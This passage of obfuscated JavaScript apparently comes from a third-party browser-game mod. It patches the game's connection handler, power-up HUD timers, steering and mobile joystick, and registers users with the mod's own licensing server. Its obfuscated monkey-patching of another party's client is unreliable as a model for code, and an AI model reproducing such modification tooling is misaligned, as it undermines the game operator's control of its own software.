                })
              }).then(function (_0x4e9888) {
                _0x4e9888.text().then(function (_0x2f1707) {
                  $("#modal_wup").html(_0x2f1707);
                  $("#op_wup").click(function (_0x3ca688) {
                    $("#modal_wup").css("display", "block");
                    $("#modal_overlay_wup_fullscreen").css("display", "block");
                    $("#modal_overlay_wup").css("display", "block");
                  });
                  _wup.load_con();
                  _wup.fnSaveGame();
                  _wup.fnSetCounts("start");
                  $("#backgroundArena").change(function () {
                    var _0x5863a8 = $(this).val();
                    vps.background = _0x5863a8;
                    vps.backgroundUri = null;
                    _0x3b6ea9.xe._g = _0x498743.bgg(_0x5863a8);
                    localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                    _wup._anApp.og.af.ng.Lg.$g(_0x3b6ea9.xe._g);
                    alert("Background changed!");
                  });
                  var _0x293204 = _wup.isNumberValid(vps.idReplaceSkin);
                  if (_0x293204) {
                    $("#inputReplaceSkin").val(vps.idReplaceSkin);
                  } else {
                    var _0x5b465b = $("#inputReplaceSkin").val();
                    _0x293204 = _wup.isNumberValid(_0x5b465b);
                    vps.idReplaceSkin = _0x293204 ? _0x5b465b : 33;
                  }
                  if (!vps.joystick) {
                    $("#joystick_checked").val(true);
                    $("#joystick_color").val("red");
                    $("#joystick_mode").val("dynamic");
                    $("#joystick_position").val("L");
                    $("#joystick_size").val(100);
                    $("#joystick_pxy").val(100);
                  } else {
                    $("#joystick_checked").prop("checked", vps.joystick.checked);
                    $("#joystick_color").val(vps.joystick.color);
                    $("#joystick_mode").val(vps.joystick.mode);
                    $("#joystick_position").val(vps.joystick.positionMode);
                    $("#joystick_size").val(vps.joystick.size);
                    $("#joystick_pxy").val(vps.joystick.pxy);
                  }
                });
              });
            case 7:
            case "end":
              return _0x22443c.stop();
          }
        }
      }, _0x513ccb);
    }));
    return function _0x50297c(_0x539456, _0x47f5a5) {
      return _0x5691bb.apply(this, arguments);
    };
  }();
  var _0x353f60 = function _0x3eb1b4(_0x21190f) {
    if (vps.PropertyManager) {
      if (vps.PropertyManager.lj) {
        _0x21190f.skinId = vps.PropertyManager.lj;
      }
      if (vps.PropertyManager.mj) {
        _0x21190f.eyesId = vps.PropertyManager.mj;
      }
      if (vps.PropertyManager.nj) {
        _0x21190f.mouthId = vps.PropertyManager.nj;
      }
      if (vps.PropertyManager.pj) {
        _0x21190f.glassesId = vps.PropertyManager.pj;
      }
      if (vps.PropertyManager.oj) {
        _0x21190f.hatId = vps.PropertyManager.oj;
      }
    }
  };
  window.registerAPI = function (_0x4aee90) {
    return fetch(window.vps.s_l + "/register", {
      headers: {
        "Content-Type": "application/json",
        "x-wuid": vps.wuid
      },
      method: "POST",
      body: JSON.stringify(_0x4aee90)
    });
  };
  var _0x1a9010 = function () {
    var _0x2495a7 = _0x8f1d97(_0x22e5a4().mark(function _0x2567fd(_0xe6df0d, _0x136311) {
      var _0x4f6208;
      var _0x4860e9;
      var _0x4efea7;
      var _0x1c681e;
      var _0x19712b;
      return _0x22e5a4().wrap(function _0x55bc5f(_0x192b6c) {
        while (1) {
          switch (_0x192b6c.prev = _0x192b6c.next) {
            case 0:
              $("#mm-params-nickname").prop("maxlength", _0x178144);
              _0x192b6c.next = 3;
              return window.registerAPI(_0xe6df0d).then(function () {
                var _0x260b48 = _0x8f1d97(_0x22e5a4().mark(function _0x418c52(_0x112f88) {
                  return _0x22e5a4().wrap(function _0x379540(_0x4131ba) {
                    while (1) {
                      switch (_0x4131ba.prev = _0x4131ba.next) {
                        case 0:
                          _0x4131ba.next = 2;
                          return _0x112f88.json();
                        case 2:
                          return _0x4131ba.abrupt("return", _0x4131ba.sent);
                        case 3:
                        case "end":
                          return _0x4131ba.stop();
                      }
                    }
                  }, _0x418c52);
                }));
                return function (_0x34614f) {
                  return _0x260b48.apply(this, arguments);
                };
              }()).catch(function () {
                $(".description-text").html("Connection problem.");
              });
            case 3:
              _0x4f6208 = _0x192b6c.sent;
              if (!_0x4f6208) {
                _0x4f6208 = {};
                _0x4f6208.tk = 1;
              }
              vps.tk = _0x4f6208.tk;
              _0x5f32d0 = _0x4f6208.customer;
              if (_0x5f32d0 === true && _0x4f6208.expiry_date) {
                setTimeout(function () {
                  var _0x3ca4c7 = "<p id=\"exp_time\" class=\"expiry-date\">Activation: " + _0x4f6208.expiry_date + "</p>";
                  $(".description-text").append(_0x3ca4c7);
                }, 200);
              }
              _0xe6df0d.propertyList = _0x4f6208.propertyList;
              _0x136311(_0xe6df0d);
              _0x49b7fd(_0x4f6208);
              _wup._anApp = _0x3b6ea9;
              _wup._tx = function (_0x12f455) {
                Object.keys(_0x12f455).forEach(function (_0x3566e5) {
                  if (_0x12f455[_0x3566e5].Yi) {
                    _0x12f455[_0x3566e5].fj.nh.Cc.xc.width = _0x12f455[_0x3566e5].fj.nh.Cc.xc.width + 2;
                    _0x12f455[_0x3566e5].fj.nh.Cc.xc.height = _0x12f455[_0x3566e5].fj.nh.Cc.xc.height + 2;
                  }
                });
              };
              _wup.Zp = _0x3b6ea9.dh.Zp;
              _0x3b6ea9.dh.Dq = function (_0x1bb18c, _0x410d9f, _0x14ea22 = 0) {
                try {
                  var _0x2ca88e = _0x3b6ea9.dh;
                  var _0x388df8 = {};
                  if (_0x388df8.connected && _0x388df8.connected === "force_refresh") {
                    alert("Update Page...");
                    _0x2ca88e.Cq();
                    return;
                  }
                  _0x2ca88e.mq = new WebSocket(_0x1bb18c);
                  _0x2ca88e.mq.binaryType = "arraybuffer";
                  _0x15b497 = _wup.ismobile ? 1.25 : 1;
                  vps.start = new Date();
                  vps.con = _0x1bb18c;
                  _0x44895b = {};
                  window.gameIntervals = [];
                  _0x498743.setIntervalRun = setInterval(function () {
                    _0x498743.ps3();
                  }, 20);
                  window.gameIntervals.push(_0x498743.setIntervalRun);
                  window.addEventListener("beforeunload", function () {
                    window.gameIntervals.forEach(_0xa24f7c => clearInterval(_0xa24f7c));
                    window.gameIntervals = [];
                  });
                  _0x2ca88e.mq.onopen = function () {
                    _0x30284c();
                    _wup.fnSetCounts("open");
                    _0x410d9f();
                  };
                  _0x2ca88e.mq.onclose = function () {
                    _0x545637();
                    _wup.fnSetCounts("close");
                    _wup.stopGame();
                    clearInterval(_0x498743.setIntervalRun);
                    _0x498743.loadBg = false;
                    vps.start = 0;
                  };
                  _0x2ca88e.mq.onerror = function (_0xd1cb2b) {
                    _0x545637();
                    _wup.fnSetCounts("close");
                    _wup.stopGame();
                    clearInterval(_0x498743.setIntervalRun);
                    _0x498743.loadBg = false;
                    vps.start = 0;
                    if (_0x14ea22 > 4) {
                      _0x2ca88e.Cq();
                    } else {
                      setTimeout(function () {
                        _0x14ea22++;
                        console.log("Reconnect server");
                        _0x3b6ea9.dh.Dq(vps.con, _0x410d9f, _0x14ea22);
                      }, 2000);
                    }
                  };
                  _0x2ca88e.mq.onmessage = function (_0x21cb75) {
                    _0x2ca88e.Kp.Ph(_0x21cb75.data);
                  };
                } catch (_0x173e44) {
                  console.log(_0x173e44);
                  _0x3b6ea9.dh.Cq();
                }
              };
              _0x3b6ea9.dh.Kp.Yh = function (_0x47fe6d, _0x265ee8) {
                _0x545637();
                this.dh.Oi();
              };
              _0x3b6ea9.og.af.ng.Ug.Uf = function (_0x5e49cf) {
                var _0x130d45 = function () {
                  return _0x498743.$F.M(_0x498743.POGL.Sprite, function () {
                    _0x498743.POGL.Sprite.call(this);
                    this.sh = 0;
                  });
                }();
                for (var _0x16466c in this.rh) {
                  if (_0x5e49cf[_0x16466c] == null || !_0x5e49cf[_0x16466c].hd) {
                    _0x498743.$F.U(this.rh[_0x16466c]);
                    delete this.rh[_0x16466c];
                  }
                }
                var _0x709ac6 = 0;
                var _0x4d2159 = 1;
                for (var _0x30cc09 in _0x5e49cf) {
                  var _0x5866f9 = _0x5e49cf[_0x30cc09];
                  if (_0x5866f9.hd) {
                    var _0x21c734 = this.rh[_0x30cc09];
                    if (!_0x21c734) {
                      var _0xce8473 = _0x3b6ea9.Lc.Ub().pb(_0x5866f9.nd).ub;
                      _0x21c734 = new _0x130d45();
                      _0x21c734.texture = _0xce8473.Ea();
                      _0x21c734.width = 39;
                      _0x21c734.height = 39;
                      this.rh[_0x30cc09] = _0x21c734;
                      this.addChild(_0x21c734);
                    }
                    ctxx.setPtc(this, _0x30cc09, _0x5866f9.od);
                    _0x21c734.sh = _0x5866f9.od;
                    var _0x3a7239 = _0x4d2159 || window.innerWidth;
                    var _0x6e711 = vps.hudSettings.mode == 0 ? _0x709ac6 : _0x3a7239 / 2 + _0x709ac6 - _0x3a7239 * vps.hudSettings.wi;
                    _0x21c734.position.x = _0x6e711 + 5;
                    _0x21c734.position.y = _0x21c734.position.y;
                    _0x709ac6 += 40;
                  }
                }
              };
              _0x3b6ea9.og.af.ng.Tg.addChild(ctxx.clock);
              _0x3b6ea9.og.af.ng.Tg.addChild(ctxx.containerCountInfo);
              ctxx.ptc = {};
              _0x4860e9 = [30, 30, 30, 80, 40, 20, 30];
              for (_0x4efea7 = 0; _0x4efea7 < _0x4860e9.length; _0x4efea7++) {
                _0x1c681e = "clock_ad" + _0x4efea7;
                ctxx.ptc[_0x1c681e] = new PIXI.Text(_0x4860e9[_0x4efea7], ctxx.fontStyle["tfc" + _0x4efea7]);
                ctxx.ptc[_0x1c681e].y = 55;
              }
              window.powerPulseEnabled = false;
              function _0x48f640() {
                if (typeof vps !== "undefined" && vps.powerPulseEnabled !== undefined) {
                  window.powerPulseEnabled = vps.powerPulseEnabled;
                  return;
                }
                const _0xc24c51 = localStorage.getItem("ctxx_powerPulseEnabled");
                if (_0xc24c51 !== null) {
                  window.powerPulseEnabled = _0xc24c51 === "true";
                  return;
                }
                window.powerPulseEnabled = false;
              }
              function _0x30f29e() {
                localStorage.setItem("ctxx_powerPulseEnabled", window.powerPulseEnabled.toString());
              }
              _0x48f640();
              function _0x1c1a7c() {
                if (!window.powerPulseEnabled || !ctxx || !ctxx.ptc) {
                  ["clock_ad0", "clock_ad1"].forEach(_0xa168f6 => {
                    if (ctxx && ctxx.ptc && ctxx.ptc[_0xa168f6] && ctxx.ptc[_0xa168f6]._pulseStarted) {
                      _0x51ba66(ctxx.ptc[_0xa168f6]);
                    }
                  });
                  return;
                }
                ["clock_ad0", "clock_ad1"].forEach(_0x28a696 => {
                  const _0xa4ac4f = ctxx.ptc[_0x28a696];
                  if (!_0xa4ac4f || !_0xa4ac4f.text) {
                    return;
                  }
                  const _0x44c3ff = parseInt(_0xa4ac4f.text);
                  if (!isNaN(_0x44c3ff) && _0x44c3ff > 0 && _0x44c3ff <= 5) {
                    _0x5e795d(_0xa4ac4f);
                  } else {
                    _0x51ba66(_0xa4ac4f);
                  }
                });
              }
              function _0x5e795d(_0x4438bd) {
                if (!_0x4438bd || _0x4438bd._pulseStarted) {
                  return;
                }
                _0x4438bd._originalStyle = {
                  fill: _0x4438bd.style.fill,
                  fontSize: _0x4438bd.style.fontSize,
                  dropShadow: _0x4438bd.style.dropShadow,
                  dropShadowColor: _0x4438bd.style.dropShadowColor,
                  dropShadowDistance: _0x4438bd.style.dropShadowDistance,
                  dropShadowBlur: _0x4438bd.style.dropShadowBlur,
                  stroke: _0x4438bd.style.stroke,
                  strokeThickness: _0x4438bd.style.strokeThickness
                };
                _0x4438bd._originalX = _0x4438bd.x;
                _0x4438bd._pulseStarted = true;
                _0x4438bd._lastPulseTime = 0;
                _0x4438bd._pulseInterval = setInterval(() => {
                  if (!_0x4438bd || !_0x4438bd.style) {
                    clearInterval(_0x4438bd._pulseInterval);
                    return;
                  }
                  const _0x5f5cdf = Date.now();
                  if (_0x5f5cdf - _0x4438bd._lastPulseTime > 800) {
                    _0x4438bd._lastPulseTime = _0x5f5cdf;
                    const _0x877f29 = _0x4438bd._originalStyle.fill;
                    const _0x15776f = _0x4438bd.x;
                    _0x4438bd.style.fontSize = (_0x4438bd._originalStyle.fontSize || 20) + 12;
                    _0x4438bd.x = _0x4438bd._originalX - 0;
                    _0x4438bd.style.stroke = "#FF0000";
                    _0x4438bd.style.strokeThickness = 1;
                    _0x4438bd.style.dropShadow = true;
                    _0x4438bd.style.dropShadowColor = "#FF0000";
                    _0x4438bd.style.dropShadowDistance = 5;
                    _0x4438bd.style.dropShadowBlur = 6;
                    _0x4438bd.x = _0x15776f;
                    setTimeout(() => {
                      if (!_0x4438bd || !_0x4438bd.style || !_0x4438bd._pulseStarted) {
                        return;
                      }
                      const _0x4b5f81 = _0x4438bd.x;
                      _0x4438bd.style.fill = _0x4438bd._originalStyle.fill;
                      _0x4438bd.style.fontSize = _0x4438bd._originalStyle.fontSize;
                      _0x4438bd.style.dropShadow = _0x4438bd._originalStyle.dropShadow;
                      _0x4438bd.style.dropShadowColor = _0x4438bd._originalStyle.dropShadowColor;
                      _0x4438bd.style.dropShadowDistance = _0x4438bd._originalStyle.dropShadowDistance;
                      _0x4438bd.style.dropShadowBlur = _0x4438bd._originalStyle.dropShadowBlur;
                      _0x4438bd.style.stroke = _0x4438bd._originalStyle.stroke;
                      _0x4438bd.style.strokeThickness = _0x4438bd._originalStyle.strokeThickness;
                      _0x4438bd.x = _0x4b5f81;
                    }, 400);
                  }
                }, 100);
              }
              function _0x51ba66(_0x205f28) {
                if (!_0x205f28 || !_0x205f28._pulseStarted) {
                  return;
                }
                if (_0x205f28._pulseInterval) {
                  clearInterval(_0x205f28._pulseInterval);
                  _0x205f28._pulseInterval = null;
                }
                _0x205f28._pulseStarted = false;
                if (_0x205f28._originalStyle && _0x205f28.style) {
                  _0x205f28.style.fill = _0x205f28._originalStyle.fill;
                  _0x205f28.style.fontSize = _0x205f28._originalStyle.fontSize;
                  _0x205f28.style.dropShadow = _0x205f28._originalStyle.dropShadow;
                  _0x205f28.style.dropShadowColor = _0x205f28._originalStyle.dropShadowColor;
                  _0x205f28.style.dropShadowDistance = _0x205f28._originalStyle.dropShadowDistance;
                  _0x205f28.style.dropShadowBlur = _0x205f28._originalStyle.dropShadowBlur;
                  _0x205f28.style.stroke = _0x205f28._originalStyle.stroke;
                  _0x205f28.style.strokeThickness = _0x205f28._originalStyle.strokeThickness;
                }
              }
              function _0x4596ce() {
                window.powerPulseEnabled = !window.powerPulseEnabled;
                _0x30f29e();
                return window.powerPulseEnabled;
              }
              ctxx.setPtc = function (_0x3a3029, _0x57459c, _0x305240) {
                try {
                  var _0xf8087 = _0x4860e9[_0x57459c] - parseInt((_0x305240 == 0.99 ? 1 : _0x305240) * _0x4860e9[_0x57459c] / 1);
                  var _0xfef26b = "clock_ad" + _0x57459c;
                  if (!_0x3a3029 || !_0x3a3029.rh || !_0x3a3029.rh[_0x57459c]) {
                    return;
                  }
                  if (!ctxx.ptc || !ctxx.ptc[_0xfef26b]) {
                    return;
                  }
                  const _0x5decef = ctxx.ptc[_0xfef26b];
                  const _0x2d7cc4 = _0x3a3029.rh[_0x57459c];
                  if (_0x5decef.parent !== _0x2d7cc4) {
                    if (_0x5decef.parent) {
                      _0x5decef.parent.removeChild(_0x5decef);
                    }
                    _0x2d7cc4.addChild(_0x5decef);
                  }
                  _0x5decef.x = _0xf8087 >= 100 ? 8 : _0xf8087 >= 10 ? 15 : 23;
                  _0x5decef.text = _0xf8087;
                  _0x5decef.visible = true;
                  _0x5decef.alpha = 1;
                  if (_0x57459c === 0 || _0x57459c === 1) {
                    setTimeout(_0x1c1a7c, 50);
                  }
                } catch (_0x85e0c) {
                  console.error("Error in setPtc:", _0x85e0c);
                }
              };
              function _0x286459() {
                if (typeof ctxx !== "undefined" && ctxx.ptc) {
                  setInterval(_0x1c1a7c, 200);
                } else {
                  setTimeout(_0x286459, 1000);
                }
              }
              _0x286459();
              window.addEventListener("beforeunload", function () {
                if (ctxx && ctxx.ptc) {
                  ["clock_ad0", "clock_ad1"].forEach(_0x32e7db => {
                    const _0x533566 = ctxx.ptc[_0x32e7db];
                    if (_0x533566 && _0x533566._pulseStarted && _0x533566._pulseInterval) {
                      clearInterval(_0x533566._pulseInterval);
                    }
                  });
                }
              });
              _0x19712b = _0x3b6ea9.og.af.ng.Eb;
              gtr.onmovepoint = function (_0x3fc2e6) {
                if (_0x3fc2e6.pointerType === "touch" && !_0x3fc2e6.isPrimary) {
                  return;
                }
                if (_0x3fc2e6.clientX !== undefined) {
                  _0x3b6ea9.og.af.Bn = Math.atan2(_0x3fc2e6.clientY - _0x19712b.offsetHeight * 0.5, _0x3fc2e6.clientX - _0x19712b.offsetWidth * 0.5);
                } else {
                  _0x3b6ea9.og.af.Bn = Math.atan2(_0x3fc2e6.pageY - _0x19712b.offsetHeight * 0.5, _0x3fc2e6.pageX - _0x19712b.offsetWidth * 0.5);
                }
              };
              gtr.onRun = function (_0x456802) {
                if (_0x456802 && _0x456802.pointerType === "touch") {
                  return;
                }
                _0x3b6ea9.og.af.An = true;
              };
              gtr.onStop = function (_0x1f1f61) {
                if (_0x1f1f61 && _0x1f1f61.pointerType === "touch") {
                  return;
                }
                _0x3b6ea9.og.af.An = false;
              };
              _0x19712b.addEventListener("pointermove", gtr.onmovepoint, true);
              _0x19712b.addEventListener("pointerdown", gtr.onRun, true);
              _0x19712b.addEventListener("pointerup", gtr.onStop, true);
              if (_wup.ismobile) {
                _0x19712b.addEventListener("touchstart", function (_0x3bb26a) {
                  if (_0x3bb26a = _0x3bb26a || window.event) {
                    const _0x2ec468 = _0x3bb26a.touches.length;
                    if (_0x2ec468 >= 2) {
                      _0x3b6ea9.og.af.An = true;
                    }
                    window.touchState = {
                      isMultiTouch: _0x2ec468 >= 2,
                      touchCount: _0x2ec468
                    };
                  }
                  _0x3bb26a.preventDefault();
                }, true);
                _0x19712b.addEventListener("touchend", function (_0x509fbe) {
                  if (_0x509fbe = _0x509fbe || window.event) {
                    const _0x16d475 = _0x509fbe.touches.length;
                    if (_0x16d475 < 2) {
                      _0x3b6ea9.og.af.An = false;
                    }
                    window.touchState = {
                      isMultiTouch: _0x16d475 >= 2,
                      touchCount: _0x16d475
                    };
                  }
                }, true);
              }
            case 35:
            case "end":
              return _0x192b6c.stop();
          }
        }
      }, _0x2567fd);
    }));
    return function _0x2aa5d1(_0x5295cb, _0x1377d4) {
      return _0x2495a7.apply(this, arguments);
    };
  }();
  function _0x2ae635() {
    var _0x41ec71 = document.createElement("div");
    _0x41ec71.style.position = "fixed";
    _0x41ec71.style.top = "0";
    _0x41ec71.style.height = "100%";
    _0x41ec71.style.width = "100%";
    _0x41ec71.style.zIndex = "1000";
    _0x41ec71.id = "zone_joystick";
    document.body.appendChild(_0x41ec71);
  }
  function _0x589218() {
    var _0x323e37 = document.getElementById("zone_joystick");
    if (_0x323e37) {
      _0x323e37.remove();
    }
  }
  var _0x545637 = function _0xaf3d5c() {
    if (_0x4c5834) {
      try {
        _0x4c5834.destroy();
        _0x4c5834 = null;
      } catch (_0x55b439) {}
      $("#up-mobile-box").remove();
      $("#up-mobile-box-slider").remove();
    }
    _0x589218();
    const _0x1601ac = ["img_1", "img_2", "img_3", "img_4", "img_o_2", "img_o_3", "img_o_4", "img_i_2", "img_i_3", "img_p_1", "img_p_2", "img_p_3", "img_p_4", "img_p_5", "img_f", "img_pf_1"];
    _0x1601ac.forEach(_0x496e6d => {
      const _0x4079b2 = document.getElementById(_0x496e6d);
      if (_0x4079b2) {
        _0x4079b2.remove();
      }
    });
  };
  var _0x30284c = function _0xc08cbe() {
    try {
      var _0x4c6d64 = function _0x846de9() {
        _0x4c5834.on("start end", function (_0x5a5082, _0x23827a) {}).on("move", function (_0x2ecef5, _0x8fa674) {
          var _0x193ffd = _0x8fa674.angle.radian <= Math.PI ? _0x8fa674.angle.radian * -1 : Math.PI - (_0x8fa674.angle.radian - Math.PI);
          _0x3b6ea9.og.af.Bn = _0x193ffd;
        });
      };
      var _0x42ac5d = function _0x25ace4() {
        if (_0x4c5834) {
          _0x4c5834.destroy();
        }
        _0x2ae635();
        const _0x2e6f29 = window.innerWidth;
        const _0x1cabda = window.innerHeight;
        const _0xabafc3 = {
          id: "img_6",
          src: atob(savedImages[9]),
          width: 50,
          height: 25,
          x: _0x2e6f29 * 0.75 - 25,
          y: 0,
          alpha: 1,
          clickable: true
        };
        gtr.createJoystickElement(_0xabafc3);
        var _0x337f32 = _0x3346cc({}, vps.joystick);
        var _0x23f367 = {};
        let _0x480dc2 = false;
        if (_0x337f32.mode === "static") {
          delete _0x337f32.zone;
          _0x337f32.position = {
            left: "95px",
            bottom: "140px"
          };
        } else {
          _0x337f32.zone = document.getElementById("zone_joystick");
          _0x337f32.mode = "dynamic";
          delete _0x337f32.position;
        }
        _0x4c5834 = nipplejs.create(_0x337f32);
        _0x4c5834.on("start end", function (_0x4b0c13, _0x3875a4) {
          setTimeout(() => {
            const _0x393f2a = document.getElementById("zone_joystick");
            if (_0x393f2a) {
              _0x393f2a.addEventListener("touchstart", function (_0x38c340) {
                if (_0x38c340.touches.length >= 2 && !_0x480dc2) {
                  _0x480dc2 = true;
                  _0x3b6ea9.og.af.An = true;
                }
              }, {
                passive: false
              });
              _0x393f2a.addEventListener("touchmove", function (_0x46acde) {
                if (_0x46acde.touches.length >= 2 && !_0x480dc2) {
                  _0x480dc2 = true;
                  _0x3b6ea9.og.af.An = true;
                } else if (_0x46acde.touches.length < 2 && _0x480dc2) {
                  _0x480dc2 = false;
                  _0x3b6ea9.og.af.An = false;
                }
              }, {
                passive: false
              });
              _0x393f2a.addEventListener("touchend", function (_0x565383) {
                if (_0x565383.touches.length < 2 && _0x480dc2) {
                  _0x480dc2 = false;
                  _0x3b6ea9.og.af.An = false;
                }
              }, {
                passive: false
              });
            }
          }, 100);
        }).on("move", function (_0xefed42, _0x3b269d) {
          var _0x1898bc = _0x3b269d.angle.radian <= Math.PI ? _0x3b269d.angle.radian * -1 : Math.PI - (_0x3b269d.angle.radian - Math.PI);
          _0x3b6ea9.og.af.Bn = _0x1898bc;
        });
      };
      gtr.createNewJoystick = function (_0x561a8c) {
        _0x2ae635();
        const _0x34c8a1 = window.innerWidth;
        const _0x2de1c0 = window.innerHeight;
        const _0x6af157 = gtr.getJoystickConfig(_0x561a8c, _0x34c8a1, _0x2de1c0);
        const _0x3087e4 = _0x6af157.find(_0x1fd85c => _0x1fd85c.clickable);
        if (_0x3087e4) {
          _0x3087e4.x = _0x34c8a1 * 0.75 - 25;
          _0x3087e4.y = 0;
          _0x3087e4.alpha = 1;
          gtr.createJoystickElement(_0x3087e4);
        }
        const _0x125fa5 = gtr.getJoystickConfig(_0x561a8c, _0x34c8a1, _0x2de1c0);
        _0x125fa5.forEach(_0x3c1c42 => {
          if (!_0x3c1c42.clickable) {
            gtr.createJoystickElement(_0x3c1c42);
          }
        });
        gtr.bindJoystickControls(_0x561a8c);
      };
      gtr.getJoystickConfig = function (_0x328b7d, _0x2a18fd, _0x15169d) {
        const _0x1d9912 = {
          1: [{
            id: "img_1",
            src: atob(savedImages[9]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_p_1",
            src: atob(savedImages[19]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }],
          2: [{
            id: "img_2",
            src: atob(savedImages[10]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_2",
            src: atob(savedImages[14]),
            width: 100,
            height: 100,
            x: 45,
            y: _0x15169d - 180,
            alpha: 0.25
          }, {
            id: "img_i_2",
            src: atob(savedImages[17]),
            width: 50,
            height: 50,
            x: 70,
            y: _0x15169d - 155,
            alpha: 0.25
          }, {
            id: "img_p_2",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }],
          3: [{
            id: "img_3",
            src: atob(savedImages[11]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_3",
            src: atob(savedImages[15]),
            width: 100,
            height: 100,
            x: 45,
            y: _0x15169d - 180,
            alpha: 0.25
          }, {
            id: "img_i_3",
            src: atob(savedImages[18]),
            width: 50,
            height: 50,
            x: 70,
            y: _0x15169d - 155,
            alpha: 0.25
          }, {
            id: "img_p_3",
            src: atob(savedImages[22]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }],
          4: [{
            id: "img_4",
            src: atob(savedImages[12]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_4",
            src: atob(savedImages[16]),
            width: 100,
            height: 100,
            x: 15,
            y: _0x15169d - 210,
            alpha: 1
          }, {
            id: "img_f",
            src: atob(savedImages[13]),
            width: 60,
            height: 60,
            x: _0x2a18fd - 100,
            y: _0x15169d - 120,
            alpha: 0.7
          }, {
            id: "img_p_4",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }, {
            id: "img_pf_1",
            src: atob(savedImages[20]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0,
            display: "none"
          }],
          5: [{
            id: "img_4",
            src: atob(savedImages[12]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_o_4",
            src: atob(savedImages[16]),
            width: 100,
            height: 100,
            x: _0x2a18fd - 115,
            y: _0x15169d - 210,
            alpha: 1
          }, {
            id: "img_f",
            src: atob(savedImages[13]),
            width: 60,
            height: 60,
            x: 20,
            y: _0x15169d - 120,
            alpha: 0.7
          }, {
            id: "img_p_5",
            src: atob(savedImages[21]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }, {
            id: "img_pf_1",
            src: atob(savedImages[20]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0,
            display: "none"
          }],
          6: [{
            id: "img_6",
            src: atob(savedImages[9]),
            width: 50,
            height: 25,
            x: _0x2a18fd * 0.75 - 25,
            y: 0,
            alpha: 1,
            clickable: true
          }, {
            id: "img_p_6",
            src: atob(savedImages[19]),
            width: 16,
            height: 16,
            x: _0x2a18fd * 0.5 - 8,
            y: _0x15169d * 0.5 - 8,
            alpha: 0.25
          }]
        };
        return _0x1d9912[_0x328b7d] || _0x1d9912[1];
      };
      gtr.createJoystickElement = function (_0xc2b3d4) {
        const _0x20d3ef = document.getElementById("zone_joystick");
        if (!_0x20d3ef) {
          return;
        }
        const _0x585800 = document.createElement("img");
        _0x585800.id = _0xc2b3d4.id;
        _0x585800.src = _0xc2b3d4.src;
        _0x585800.style.cssText = "\n            position: absolute;\n            width: " + _0xc2b3d4.width + "px;\n            height: " + _0xc2b3d4.height + "px;\n            left: " + _0xc2b3d4.x + "px;\n            top: " + _0xc2b3d4.y + "px;\n            opacity: " + (_0xc2b3d4.alpha || 1) + ";\n            display: " + (_0xc2b3d4.display || "block") + ";\n            pointer-events: " + (_0xc2b3d4.clickable ? "auto" : "none") + ";\n            user-select: none;\n            z-index: " + (_0xc2b3d4.clickable ? "9999" : "1001") + ";\n            cursor: " + (_0xc2b3d4.clickable ? "pointer" : "default") + ";\n          ";
        if (_0xc2b3d4.clickable) {
          _0x585800.onclick = function (_0x1b88a7) {
            _0x1b88a7.stopPropagation();
            _0x1b88a7.preventDefault();
            const _0x595517 = vps.joystickType || 1;
            const _0x41b1c7 = _0x595517 === 6 ? 1 : _0x595517 + 1;
            vps.joystickType = _0x41b1c7;
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            gtr.clearAllJoystickElements();
            if (_0x41b1c7 === 6) {
              _0x42ac5d();
            } else {
              gtr.createNewJoystick(_0x41b1c7);
            }
          };
          _0x585800.addEventListener("touchstart", function (_0x538880) {
            _0x538880.stopPropagation();
            _0x538880.preventDefault();
            _0x585800.click();
          }, {
            passive: false
          });
        }
        _0x20d3ef.appendChild(_0x585800);
      };
      gtr.bindJoystickControls = function (_0x140be5) {
        const _0xe0c05 = document.getElementById("zone_joystick");
        if (!_0xe0c05) {
          return;
        }
        let _0x4d4705 = false;
        let _0x13e182 = 0;
        let _0x4272e2 = 0;
        let _0x3d22c4 = false;
        let _0x48426c = false;
        _0xe0c05.addEventListener("touchstart", function (_0x3627d0) {
          if (_0x3627d0.touches.length > 0) {
            _0x4d4705 = true;
            if (_0x3627d0.touches.length >= 2) {
              _0x3d22c4 = true;
              _0x3b6ea9.og.af.An = true;
            }
            if (_0x3627d0.touches.length === 1) {
              if ((_0x140be5 === 2 || _0x140be5 === 3) && vps.joystick && vps.joystick.mode === "dynamic") {
                _0x13e182 = _0x3627d0.touches[0].clientX;
                _0x4272e2 = _0x3627d0.touches[0].clientY;
              } else {
                _0x13e182 = window.innerWidth * 0.5;
                _0x4272e2 = window.innerHeight * 0.5;
              }
              const _0x4fc3a0 = _0x140be5 === 1 ? "img_p_1" : _0x140be5 === 2 ? "img_p_2" : _0x140be5 === 3 ? "img_p_3" : _0x140be5 === 4 ? "img_p_4" : _0x140be5 === 5 ? "img_p_5" : "img_p_1";
              const _0x2167f1 = document.getElementById(_0x4fc3a0);
              if (_0x2167f1 && !_0x48426c) {
                _0x2167f1.style.opacity = "1";
                _0x2167f1.style.left = _0x13e182 - 8 + "px";
                _0x2167f1.style.top = _0x4272e2 - 8 + "px";
